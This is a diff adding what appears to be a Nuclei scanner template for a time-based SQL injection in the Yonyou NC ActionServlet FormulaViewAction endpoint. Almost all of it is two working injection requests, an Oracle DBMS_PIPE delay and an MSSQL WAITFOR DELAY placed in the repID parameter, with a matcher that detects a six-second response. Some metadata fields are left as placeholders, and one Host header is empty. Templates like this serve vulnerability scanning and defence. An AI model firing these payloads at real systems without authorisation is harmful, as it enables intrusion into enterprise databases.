@@ -1,0 +1,27 @@
+id: yonyou-nc-FormulaViewAction-sqli
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 用友NC-ActionServlet-sql注入漏洞 app="用友-UFIDA-NC"
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+#oracle 
+      - |-    
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1')%20AND%206371%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28107%29%7C%7CCHR%2866%29%7C%7CCHR%28105%29%7C%7CCHR%2889%29%2C6%29--&unitID=public HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        SOAPAction: http://tempuri.org/GetHomeInfo
+#mssql        
+      - |-
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1')%20WAITFOR%20DELAY%20'0:0:6'--+&unitID=public HTTP/1.1
+        Host:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        SOAPAction: http://tempuri.org/GetHomeInfo
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=6"
